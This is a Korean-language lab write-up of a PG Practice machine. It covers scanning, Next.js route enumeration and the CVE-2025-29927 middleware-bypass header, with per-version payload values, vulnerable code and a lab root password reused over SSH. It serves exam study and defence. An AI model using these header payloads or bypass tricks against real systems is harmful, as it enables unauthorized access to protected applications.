---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/auth-bypass
  - tech/cred/reuse
type: machine
platform: pg
os: linux
ip: 192.168.248.215
ports: [22, 3000]
services: [ppp, ssh]
cves: [CVE-2025-29927]
status: solved
manual_tags: true
tech_count: 2
---

> [!info] PG Practice — Intermediate
> **타겟** 192.168.248.215 · **OS** Ubuntu 24.04.1 LTS (`nextjs`, 6.8.0-58-generic) · **난이도** Intermediate · **플래그 1개**
> **경로 요약** 3000 **Next.js**(Pages Router) → 보호 라우트가 미들웨어로만 가려져 있음 → **CVE-2025-29927 `x-middleware-subrequest` 헤더 주입**으로 미들웨어 통째로 건너뛰기 → `/admin`에 평문 노출된 `root:modeling-katja-lad-common` → **SSH root 직행** → `/root/proof.txt`
> **권한상승 단계 없음.** 웹 인가 우회 한 방이 곧 root다.

## 0. 이 박스에서 배우는 것

- **미들웨어 기반 인가(authorization)의 구조적 취약성** — 인증 판정이 라우트 핸들러가 아니라 **앞단 계층**에 있으면, 그 계층을 건너뛰는 방법 하나로 전체 인가가 무너진다
- **"내부 전용" 헤더를 신뢰하는 설계의 파산** — `x-middleware-subrequest`는 프레임워크가 자기 자신에게 보내는 표식인데, **신뢰 경계에서 제거되지 않는다**
- **CVE-2025-29927의 정확한 메커니즘** — 왜 그 헤더 이름인지, 왜 버전에 따라 값이 달라지는지, 왜 `:`로 반복해야 하는지
- **인가 우회 벡터 일반론** — 헤더 주입 · 경로 정규화 차이 · HTTP 메서드 변경 · 대소문자 · 프록시/백엔드 파싱 불일치
- **디렉터리 스캐너가 리다이렉트를 자동 필터링해서 핵심 라우트를 숨긴다** — 이 박스에서 실제로 `/admin`이 결과에 안 나왔다
- **Next.js 애플리케이션의 라우트를 수동으로 확실히 뽑는 법** (`_buildManifest.js`)
- **웹에서 얻은 평문 자격증명 → SSH 재사용**. 크랙이 아니라 열거가 답인 전형

> [!tip] 시험 출제 가능성
> **중간~높다.** CVE-2025-29927 자체가 그대로 나올 확률은 낮지만, **"앞단이 막고 있는데 뒷단은 아무 검사도 안 한다"** 는 구조는 OSCP 시험 웹 박스의 단골이다.
> 시험장 변형 예상 모습:
> - nginx `location /admin { deny all; }` → 백엔드 앱은 무방비 → `/./admin`·`/admin/`·`//admin`·`/%61dmin`로 우회
> - 리버스 프록시가 `X-Forwarded-For`·`X-Real-IP`·`X-Remote-User`를 지우지 않음 → 헤더 주입으로 내부망/관리자 행세
> - `GET`만 막고 `POST`·`HEAD`는 통과
> - Basic Auth를 프록시에서만 걸고, 백엔드 포트(8080/3000)가 직접 열려 있음
>
> **핵심 반사: 403/307로 튕기는 엔드포인트를 보면 "권한이 없다"가 아니라 "누가 막고 있는가"를 먼저 물어라.**

---

## 1. 정찰

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/MiddlewareBypass]
└─$ nnmap 192.168.248.215
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-19 10:10 +0900
Nmap scan report for 192.168.248.215
Host is up (0.086s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     X-Powered-By: Next.js
|     ETag: "yh2nq0gvow1u8"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2384
|     Vary: Accept-Encoding
|     Date: Wed, 19 Aug 2026 01:11:02 GMT
|     Connection: close
|     <!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><meta name="next-head-count" content="2"/><link rel="preload" href="/_next/static/css/6f9a5cffec7d2852.css" as="style"/><link rel="stylesheet" href="/_next/static/css/6f9a5cffec7d2852.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8fa1640cc84ba8fe.js" defer=""></script><script src="/_next/static/chunks/framework-64ad27b21261a9ce.js" defer=""></script><script src="/_next/static/chunks/main-876326609259083c.js" defer=""></script><script src="/_nex
|   HTTPOptions:
|     HTTP/1.1 405 Method Not Allowed
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     X-Powered-By: Next.js
|     ETag: "14ck9o6y74d1o1"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2161
|     Vary: Accept-Encoding
|     Date: Wed, 19 Aug 2026 01:11:03 GMT
|     Connection: close
|     <!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>405: Method Not Allowed</title><meta name="next-head-count" content="3"/><link rel="preload" href="/_next/static/css/6f9a5cffec7d2852.css" as="style"/><link rel="stylesheet" href="/_next/static/css/6f9a5cffec7d2852.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8fa1640cc84ba8fe.js" defer=""></script><script src="/_next/static/
|   Help, NCP:
|     HTTP/1.1 400 Bad Request
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.98%I=7%D=8/19%Time=6A8502A7%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,A1E,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20Next\.js\r\nET
SF:ag:\x20\"yh2nq0gvow1u8\"\r\nContent-Type:\x20text/html;\x20charset=utf-
SF:8\r\nContent-Length:\x202384\r\nVary:\x20Accept-Encoding\r\nDate:\x20We
SF:d,\x2019\x20Aug\x202026\x2001:11:02\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n<!DOCTYPE\x20html><html><head><meta\x20charSet=\"utf-8\"/><meta\x20n
SF:ame=\"viewport\"\x20content=\"width=device-width\"/><meta\x20name=\"nex
SF:t-head-count\"\x20content=\"2\"/><link\x20rel=\"preload\"\x20href=\"/_n
SF:ext/static/css/6f9a5cffec7d2852\.css\"\x20as=\"style\"/><link\x20rel=\"
SF:stylesheet\"\x20href=\"/_next/static/css/6f9a5cffec7d2852\.css\"\x20dat
SF:a-n-g=\"\"/><noscript\x20data-n-css=\"\"></noscript><script\x20defer=\"
SF:\"\x20nomodule=\"\"\x20src=\"/_next/static/chunks/polyfills-42372ed1304
SF:31b0a\.js\"></script><script\x20src=\"/_next/static/chunks/webpack-8fa1
SF:640cc84ba8fe\.js\"\x20defer=\"\"></script><script\x20src=\"/_next/stati
SF:c/chunks/framework-64ad27b21261a9ce\.js\"\x20defer=\"\"></script><scrip
SF:t\x20src=\"/_next/static/chunks/main-876326609259083c\.js\"\x20defer=\"
SF:\"></script><script\x20src=\"/_nex")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptions,9B1
SF:,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nAllow:\x20GET\r\nAllo
SF:w:\x20HEAD\r\nCache-Control:\x20private,\x20no-cache,\x20no-store,\x20m
SF:ax-age=0,\x20must-revalidate\r\nX-Powered-By:\x20Next\.js\r\nETag:\x20\
SF:"14ck9o6y74d1o1\"\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCo
SF:ntent-Length:\x202161\r\nVary:\x20Accept-Encoding\r\nDate:\x20Wed,\x201
SF:9\x20Aug\x202026\x2001:11:03\x20GMT\r\nConnection:\x20close\r\n\r\n<!DO
SF:CTYPE\x20html><html><head><meta\x20charSet=\"utf-8\"/><meta\x20name=\"v
SF:iewport\"\x20content=\"width=device-width\"/><title>405:\x20Method\x20N
SF:ot\x20Allowed</title><meta\x20name=\"next-head-count\"\x20content=\"3\"
SF:/><link\x20rel=\"preload\"\x20href=\"/_next/static/css/6f9a5cffec7d2852
SF:\.css\"\x20as=\"style\"/><link\x20rel=\"stylesheet\"\x20href=\"/_next/s
SF:tatic/css/6f9a5cffec7d2852\.css\"\x20data-n-g=\"\"/><noscript\x20data-n
SF:-css=\"\"></noscript><script\x20defer=\"\"\x20nomodule=\"\"\x20src=\"/_
SF:next/static/chunks/polyfills-42372ed130431b0a\.js\"></script><script\x2
SF:0src=\"/_next/static/chunks/webpack-8fa1640cc84ba8fe\.js\"\x20defer=\"\
SF:"></script><script\x20src=\"/_next/static/");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   85.22 ms 192.168.45.1
2   85.19 ms 192.168.45.254
3   85.87 ms 192.168.251.1
4   86.28 ms 192.168.248.215

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.93 seconds
```

> [!note] 이 출력에서 실제로 중요한 줄은 넷뿐이다
> | 줄 | 왜 중요한가 |
> |---|---|
> | `Not shown: 65533 filtered tcp ports` | **전 포트 스캔이 돌았다**는 증거. 열린 건 22·3000 두 개뿐 — 공격면이 극단적으로 좁으니 3000에 전부를 걸어야 한다 |
> | `3000/tcp open  ppp?` | nmap이 **서비스 이름을 틀렸다.** `ppp`는 무시하고 `fingerprint-strings`의 실제 HTTP 응답을 봐라 |
> | `X-Powered-By: Next.js` | **제품 확정.** 이 헤더 하나로 "Node/Next.js SSR 앱"이 정해지고 뒤의 모든 판단이 여기서 갈린다 |
> | `next-head-count` / `_next/static/chunks/pages/...` | **Pages Router**다 (App Router면 `_next/static/chunks/app/...`). 미들웨어 모듈 이름 후보가 달라진다 → 2-3장 |

> [!warning] `3000/tcp open ppp?` 를 보고 넘어가지 마라
> nmap의 `SERVICE` 열은 **`/usr/share/nmap/nmap-services`의 포트 번호 매핑**일 뿐 실제 프로토콜이 아니다. 3000번은 그 파일에서 `ppp`로 등록돼 있다.
> `?`가 붙었다는 건 **버전 탐지가 실패했다**는 뜻이고, 그럴 때 nmap은 원시 응답을 `fingerprint-strings`로 뱉는다. **거기에 답이 다 있다.**
> 반사적으로 `curl -I http://TARGET:3000/` 한 번 더 쳐서 확인하는 습관.

> [!tip] `nnmap` 은 오타가 아니라 별칭이다 `[가정]`
> 명령은 `nnmap 192.168.248.215` 인데 출력에는 **VERSION 열 · OS 탐지 · TRACEROUTE · 전 포트 결과**가 다 있다. 맨 `nmap <IP>`로는 절대 안 나오는 출력이므로, `sudo nmap -sCV -A -p- --min-rate ...` 를 감싼 셸 별칭으로 판단한다.
> **시험장 kali는 내 별칭이 없다.** 노트에는 풀 명령을 적어두는 편이 안전하다:
> ```bash
> sudo nmap -sCV -A -p- -Pn --min-rate 5000 -oN nmap.log 192.168.248.215
> ```
> | 플래그 | 역할 | 빼면 |
> |---|---|---|
> | `-p-` | 65535 전 포트 | 3000번은 기본 1000포트에 **포함**되지만, 8080·17445 같은 고번호 서비스는 통째로 놓친다 |
> | `-sCV` | 기본 NSE 스크립트 + 버전 탐지 | `X-Powered-By: Next.js`가 안 나온다 → 제품 식별 실패 |
> | `-A` | OS·traceroute 추가 | 정보량만 줄 뿐 필수는 아님. 시간이 급하면 뺀다 |
> | `--min-rate 5000` | 최소 전송률 고정 | 필터링 포트 65533개를 기다리다 **10분 이상** 걸린다 |
> | `-Pn` | 핑 스킵 | ICMP 차단 대상에서 "호스트 다운"으로 오판 |

### 서비스 식별 — 버전은 어디까지 확정되는가

| 항목 | 판정 | 근거 |
|---|---|---|
| 웹 프레임워크 | **Next.js** | `X-Powered-By: Next.js` 응답 헤더 (근거 1) + `/_next/static/...` 자산 경로 (근거 2) |
| 라우팅 방식 | **Pages Router** | `_next/static/chunks/pages/index-*.js`, `<meta name="next-head-count">` |
| 빌드 ID | `y--UTiBhyE-_5xl_ZjRqu` | `/_next/static/<buildId>/_buildManifest.js` 경로 |
| 미들웨어 모듈 이름 | **`middleware`** (루트 `middleware.ts`) | 산출물 `CVE-2025-29927/poc.sh`가 `middleware` 5회 반복으로 성공했다 (3장) → **12.2 이상 확정** |
| 정확한 Next.js 버전 | **미확정** `[가정]` | 외부에서 버전 문자열이 노출되지 않았다. 익스플로잇이 **성공했다는 사실**로 "패치 이전"임만, 모듈 이름으로 "12.2 이상"임만 확정된다 |
| OS | **Ubuntu 24.04.1 LTS**, 커널 6.8.0-58 | SSH 배너의 `Ubuntu 3ubuntu13.11` (근거 1) + 로그인 후 MOTD (근거 2). nmap의 OS 추측(`4.15–5.19`, MikroTik)은 **전부 틀렸다** |

> [!warning] nmap OS 추측을 믿지 마라
> `Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port` — **closed 포트가 하나도 없으면 OS 지문 채취가 성립하지 않는다.** 이 박스는 65533개가 전부 `filtered`였다.
> 실제 OS는 Ubuntu 24.04(커널 6.8)인데 nmap은 "Linux 4.15–5.19 또는 MikroTik RouterOS"라고 했다. **커널 버전은 서비스 배너로 교차 확인해야 한다.**

> [!note] 왜 버전 특정이 안 됐는가 — 그리고 시험장에서 어떻게 얻는가
> Next.js는 기본적으로 버전을 응답에 넣지 않는다(`X-Powered-By: Next.js` — 버전 없음). 수동 확정 경로:
> 1. `/_next/static/chunks/main-*.js` 안의 `version` 문자열이나 특징적 심볼을 grep
> 2. `framework-*.js`의 React 버전으로 Next.js 세대를 역산 (React 18 → Next 13+)
> 3. **셸을 잡은 뒤** `cat /path/to/app/package.json` · `npm ls next` · `cat .next/BUILD_ID`
> 4. 자산 파일명 해시(`polyfills-42372ed130431b0a.js`)를 GitHub에서 검색 — 릴리스별로 고정 해시라 버전이 특정되기도 한다
>
> **이 박스는 타겟이 정지되어 재검증 불가하다.** 위 절차는 다음 박스용 체크리스트다.

### feroxbuster

```bash
┌──(kali㉿kali)-[~/PG/MiddlewareBypass]
└─$ feroxbuster -u http://192.168.248.215:3000/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip -t 100

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.248.215:3000/
 🚩  In-Scope Url          │ 192.168.248.215
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html, bak, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l       65w     2169c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
307      GET        1l        1w       13c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
308      GET        1l        1w       20c http://192.168.248.215:3000/_next/static/chunks/ => http://192.168.248.215:3000/_next/static/chunks
200      GET        1l        1w      885c http://192.168.248.215:3000/_next/static/y--UTiBhyE-_5xl_ZjRqu/_buildManifest.js
200      GET        1l        2w       77c http://192.168.248.215:3000/_next/static/y--UTiBhyE-_5xl_ZjRqu/_ssgManifest.js
308      GET        1l        1w       12c http://192.168.248.215:3000/application/ => http://192.168.248.215:3000/application
200      GET        1l      102w     6558c http://192.168.248.215:3000/_next/static/chunks/664-fb5491d3140dd9e7.js
200      GET        1l       57w     1635c http://192.168.248.215:3000/profile
200      GET        1l       73w     1697c http://192.168.248.215:3000/_next/static/chunks/pages/index-f1f5166c2b73a744.js
200      GET        1l     2125w   112594c http://192.168.248.215:3000/_next/static/chunks/polyfills-42372ed130431b0a.js
308      GET        1l        1w       35c http://192.168.248.215:3000/_next/static/y--UTiBhyE-_5xl_ZjRqu/ => http://192.168.248.215:3000/_next/static/y--UTiBhyE-_5xl_ZjRqu
308      GET        1l        1w       13c http://192.168.248.215:3000/_next/static/ => http://192.168.248.215:3000/_next/static
308      GET        1l        1w       26c http://192.168.248.215:3000/_next/static/chunks/pages/ => http://192.168.248.215:3000/_next/static/chunks/pages
308      GET        1l        1w        4c http://192.168.248.215:3000/api/ => http://192.168.248.215:3000/api
200      GET        1l       33w     1430c http://192.168.248.215:3000/_next/static/chunks/webpack-8fa1640cc84ba8fe.js
308      GET        1l        1w        6c http://192.168.248.215:3000/_next/ => http://192.168.248.215:3000/_next
200      GET        1l        9w      471c http://192.168.248.215:3000/_next/static/chunks/pages/_app-87cee5540118d1b4.js
200      GET        3l      182w     7454c http://192.168.248.215:3000/_next/static/css/6f9a5cffec7d2852.css
308      GET        1l        1w       17c http://192.168.248.215:3000/_next/static/css/ => http://192.168.248.215:3000/_next/static/css
200      GET        1l       92w     2212c http://192.168.248.215:3000/logs
200      GET        1l       90w     2211c http://192.168.248.215:3000/reports
200      GET        1l       91w     2223c http://192.168.248.215:3000/settings
200      GET        1l       47w     1868c http://192.168.248.215:3000/_next/static/chunks/pages/logs-e08fbafd4209a311.js
200      GET        1l     2293w   116421c http://192.168.248.215:3000/_next/static/chunks/main-876326609259083c.js
200      GET        1l     2735w   139978c http://192.168.248.215:3000/_next/static/chunks/framework-64ad27b21261a9ce.js
200      GET        1l      115w     2384c http://192.168.248.215:3000/
200      GET        1l       57w     2062c http://192.168.248.215:3000/_next/static/chunks/pages/profile-aebf9cb7e58e98f1.js
200      GET        1l       45w     1863c http://192.168.248.215:3000/_next/static/chunks/pages/reports-38a4bd25a2bb0a76.js
200      GET        1l       46w     1875c http://192.168.248.215:3000/_next/static/chunks/pages/settings-40ca8c5913cdef6d.js
200      GET        1l       62w     1984c http://192.168.248.215:3000/_next/static/chunks/pages/unauthorized-ea91fdd0b13897c5.js
200      GET        1l      107w     2314c http://192.168.248.215:3000/unauthorized
[####################] - 4m    180192/180192  0s      found:29      errors:0
[####################] - 4m    180000/180000  714/s   http://192.168.248.215:3000/  
```

> [!danger] **`/admin`이 이 결과에 없다.** 그런데 존재한다 — 스캐너 함정
> 두 번째 줄을 봐라:
> ```
> 307      GET        1l        1w       13c Auto-filtering found 404-like response and created new filter
> ```
> feroxbuster는 **"거의 모든 경로가 같은 307을 뱉는다"** 고 판단해 **307 응답을 통째로 필터에서 걸러버렸다.** 그리고 미들웨어가 보호 라우트에 거는 리다이렉트가 정확히 **307**(`NextResponse.redirect()`의 기본값)이다.
> 즉 **핵심 타겟인 `/admin`이 필터에 걸려 화면에 안 나왔다.**
>
> **탈출구 3가지:**
> ```bash
> # ① 자동 필터 끄기 — auto-filter를 끄는 유일한 방법
> feroxbuster -u http://192.168.248.215:3000/ -w <wordlist> --dont-filter
>
> # ② ①을 켠 채로 404만 명시적으로 걸러 노이즈를 줄인다 (-D 없이는 성립하지 않는다)
> feroxbuster -u ... -D -C 404
>
> # ③ 리다이렉트를 따라가서 최종 응답으로 판정 — 경로 발견용이지, 우회 성공 판정용이 아니다
> feroxbuster -u ... -r
> ```
> **`-C`는 `--filter-status`의 축약형이다** — 둘을 나란히 쓰면 같은 플래그를 두 번 쓰는 것일 뿐이고, `-C`는 **deny-list**여서 wildcard auto-filter를 **끄지 못한다.** 그것을 끄는 것은 `-D/--dont-filter` 하나뿐이라 ②는 반드시 ①과 조합돼야 한다.
> ③의 `-r`도 마찬가지로 **열거 단계 전용**이다. 3장의 우회 성공 판정 단계에서 리다이렉트를 따라가면 `curl -L`과 똑같이 성공을 실패로 오판한다(3장 · 7장 6번).
> `gobuster`를 쓴다면 `-s 200,204,301,302,307,308,401,403` 로 **307/308을 명시**하고, `ffuf`라면 `-mc all -fs <404크기>` 로 **코드가 아니라 크기로 거른다.**

> [!tip] 결과에서 실제로 건진 정보
> | 항목 | 의미 |
> |---|---|
> | `/profile` `/logs` `/reports` `/settings` (200) | **인증 없이 열리는 페이지들.** 미들웨어가 이들은 통과시킨다 |
> | `/unauthorized` (200) + `pages/unauthorized-*.js` | **"차단 시 보내는 곳"이 별도 페이지로 존재한다** → **누군가가 뭔가를 막고 있다**는 결정적 신호 |
> | `/api` (308) | API 라우트 존재 |
> | `/application` (308) | 후행 슬래시 정규화. 라우트 자체는 존재 |
> | `_buildManifest.js` (885c) | **모든 페이지 라우트 목록**이 여기 들어 있다 |

### 수동 열거 — Next.js 라우트는 워드리스트로 찾는 게 아니다

> [!note] `_buildManifest.js` 는 Next.js의 사이트맵이다
> Pages Router는 빌드 시 **전체 페이지 경로 → 청크 파일 매핑**을 `_buildManifest.js`에 넣는다. 워드리스트에 없는 라우트도 여기엔 다 있다.
> ```bash
> # 1) 빌드 ID 확보 (메인 페이지 HTML에서)
> curl -s http://192.168.248.215:3000/ | grep -oE '/_next/static/[^/]+/_buildManifest\.js'
>
> # 2) 매니페스트에서 라우트만 추출
> curl -s http://192.168.248.215:3000/_next/static/y--UTiBhyE-_5xl_ZjRqu/_buildManifest.js \
>   | grep -oE '"/[^"]*"' | tr -d '"' | sort -u
>
> # 3) 빌드된 페이지 청크 이름으로도 라우트가 드러난다
> curl -s http://192.168.248.215:3000/ | grep -oE 'chunks/pages/[a-z0-9_-]+' | sort -u
> ```
> feroxbuster 결과의 `chunks/pages/` 목록만 봐도 `index` · `profile` · `logs` · `reports` · `settings` · `unauthorized` · `_app`이 나온다.
> **이 박스의 실제 흐름에서 `/admin`을 어떤 경로로 찾았는지는 원문에 기록이 없다** `[가정]`. 하지만 **위 매니페스트 방식이 스캐너 필터에 영향받지 않는 유일하게 확실한 방법**이므로 이것을 표준 절차로 남긴다.

> [!tip] Next.js를 만나면 먼저 치는 5줄
> ```bash
> curl -sI http://TARGET:3000/                                   # X-Powered-By, 미들웨어 응답헤더
> curl -s  http://TARGET:3000/ | grep -oE '/_next/static/[^"]+'  # 빌드 ID·청크 목록
> curl -s  http://TARGET:3000/_next/static/<buildId>/_buildManifest.js   # 전체 라우트
> curl -s  http://TARGET:3000/api/                                # API 라우트 존재 여부
> curl -sI http://TARGET:3000/admin                               # 307/302면 → 미들웨어 인가 의심
> ```

---

## 2. 취약점 분석

### 2-1. 배경 지식 — Next.js middleware란 무엇인가

Next.js의 **미들웨어**는 프로젝트 루트의 `middleware.ts`(또는 `src/middleware.ts`, 구버전은 `pages/_middleware.ts`) 한 파일이다. **모든 요청이 라우트 핸들러에 도달하기 전에** 이 함수를 통과한다.

```ts
// middleware.ts — 이 박스 앱의 구조 [가정] (소스 미확보, 동작으로 역산)
import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

export function middleware(request: NextRequest) {
  const session = request.cookies.get('session')
  if (!isAdmin(session)) {
    return NextResponse.redirect(new URL('/unauthorized', request.url))  // ← 307
  }
  return NextResponse.next()
}

// matcher의 실제 범위는 미상 [가정] — 확정된 것은 "최소 /admin을 포함한다"뿐이다
export const config = { matcher: ['/admin/:path*'] }
```

> [!warning] `matcher`를 `['/admin/:path*']`로 못박지 마라 — 관측과 어긋난다
> feroxbuster의 auto-filter는 **존재하지 않는 무작위 경로**에 대한 응답을 보고 만들어진다. 그 필터가 **307**으로 생성됐다는 것은 **무작위 경로도 307을 냈다**는 뜻이고, 그러면 `matcher`가 `/admin`보다 **훨씬 넓다**(예: `'/((?!_next|api).*)'` 류의 catch-all)는 결론이 나온다.
> 위 코드는 **설명용 최소 형태**이고, 이 박스의 실제 값은 **"최소 `/admin` 포함, 실제 범위 미상"** 이다 `[가정]`. 소스를 확보하지 않은 채 범위를 단정하면 "왜 `/profile`은 200인가" 같은 질문에서 앞뒤가 맞지 않는다.

> [!note] 왜 여기에 인가를 넣고 싶어지는가
> - **한 곳에서 전부 처리된다** — 라우트가 100개여도 미들웨어 한 파일이면 끝
> - **엣지에서 실행된다** — Vercel Edge Runtime에서 지연 없이 판정
> - **선언적이다** — `matcher`로 보호 대상을 정규식처럼 기술
>
> 개발자 입장에서 매력적인 설계다. **문제는 이게 "인가"가 아니라 "인가처럼 보이는 필터"라는 점**이다.

### 2-2. 왜 취약한가 — `x-middleware-subrequest`의 존재 이유와 결함

미들웨어 안에서 `fetch()`로 자기 앱의 다른 경로를 호출하면 그 요청도 다시 미들웨어를 통과한다 → **무한 재귀**. Next.js는 이걸 막으려고 **내부 서브요청에 표식 헤더를 붙이고, 미들웨어 실행기가 그 표식을 보면 미들웨어를 건너뛰게** 만들었다.

패치 이전 실행기 코드의 요지(업스트림 Next.js `server/web/` 계열, **이 박스에서 추출한 것이 아니라 공개된 취약 코드**):

```js
// 요청 헤더에서 표식을 꺼낸다
const subreq = params.request.headers['x-middleware-subrequest'];
const subrequests = typeof subreq === 'string' ? subreq.split(':') : [];

// 이번에 실행할 미들웨어 모듈 이름이 표식 목록에 있으면 → 실행하지 않고 그냥 통과
if (subrequests.includes(middlewareInfo.name)) {
  return {
    response: NextResponse.next(),   // ← 인가 검사 없이 라우트 핸들러로 직행
    waitUntil: Promise.resolve(),
  };
}
```

> [!danger] 결함은 한 문장으로 요약된다
> **"내부 전용"으로 설계된 헤더가 신뢰 경계에서 제거되지 않는다.**
>
> `x-middleware-subrequest`는 프레임워크가 **자기 자신에게** 보내는 신호였다. 그런데 **외부 클라이언트가 보낸 요청에서도 똑같이 읽는다.** 발신자를 검증하는 장치(서명·논스·비밀값)가 전혀 없다.
> 공격자는 헤더 한 줄만 얹으면 실행기에게 **"이건 내부 요청이니 미들웨어 돌리지 마"** 라고 거짓말할 수 있다.

이 결함이 치명적인 이유는 **미들웨어가 유일한 인가 장치**였기 때문이다. `/admin` 페이지 컴포넌트에는 세션 검사가 없다 — 검사는 앞단에서 이미 끝났다고 **가정**하고 만들었으니까.

```
정상 요청:   Client ──→ [middleware: 세션 검사] ──✗ 307 /unauthorized
공격 요청:   Client ──→ [middleware: SKIP]      ──→ /admin 핸들러 ──→ 200 + 크리덴셜
                          ↑
                  x-middleware-subrequest 한 줄
```

**CVE-2025-29927 / GHSA-f82v-jwr5-mffw · CVSS 9.1 (Critical) · 2025-03-21 공개.**

| 계열 | 영향 버전 | 패치 버전 |
|---|---|---|
| 15.x | `< 15.2.3` | **15.2.3** |
| 14.x | `< 14.2.25` | **14.2.25** |
| 13.x | `< 13.5.9` | **13.5.9** |
| 12.x | `< 12.3.5` | **12.3.5** |
| 11.1.4 ~ 12.3.4 | 영향 있음 | **12.3.5** — GHSA-f82v-jwr5-mffw가 정식 수정을 12.3.5로 명시한다. **11.x 전용 백포트가 없을 뿐 "공식 대응이 없다"는 뜻이 아니다** → 12.3.5로 올리는 것이 공식 경로 |

### 2-3. 왜 이 페이로드인가 — 조각별 해설

이 CVE의 페이로드는 **헤더 이름 하나 + 값 하나**가 전부다. 값이 무엇이어야 하는지가 버전에 따라 갈린다.

| 조각 | 역할 |
|---|---|
| `x-middleware-subrequest` | **헤더 이름 그 자체가 익스플로잇이다.** 실행기가 이 이름을 하드코딩으로 읽는다 |
| 값 = 미들웨어 **모듈 이름** | `includes()` 비교 대상. 파일 위치에 따라 `middleware` · `src/middleware` · `pages/_middleware` |
| `:` 구분자 | 실행기가 `split(':')` 하므로 **여러 후보를 한 번에 담을 수 있다** |
| 같은 이름 5회 반복 | **15.x 전용.** 15.x는 `includes()`가 아니라 **등장 횟수가 `MAX_RECURSION_DEPTH`(=5) 이상인지**를 본다 |

버전별 최소 페이로드:

| 버전대 | 미들웨어 파일 | 헤더 값(모듈 이름) | 반복 조건 |
|---|---|---|---|
| `11.1.4 ~ 12.1` | `pages/_middleware.ts` | `pages/_middleware` | 1회 — `includes()` 판정 |
| `12.2 ~ 15.x` | 루트 `middleware.ts` | `middleware` | 1회 — `includes()` 판정 |
| `12.2 ~ 15.x` (소스가 `src/` 아래) | `src/middleware.ts` | `src/middleware` | 1회 — `includes()` 판정 |
| `15.x` | 루트 `middleware.ts` | `middleware` | **5회 이상** — `MAX_RECURSION_DEPTH`(=5) **개수** 판정 |

> [!warning] `pages/_middleware`는 **라우터 종류가 아니라 버전** 문제다
> `pages/_middleware.ts`는 **11.1.4 ~ 12.1 전용 구식 배치**이고, **12.2부터 루트 `middleware.ts` 하나로 강제**됐다. Pages Router를 쓰는 15.x 앱도 미들웨어 파일은 **루트 `middleware.ts`**다.
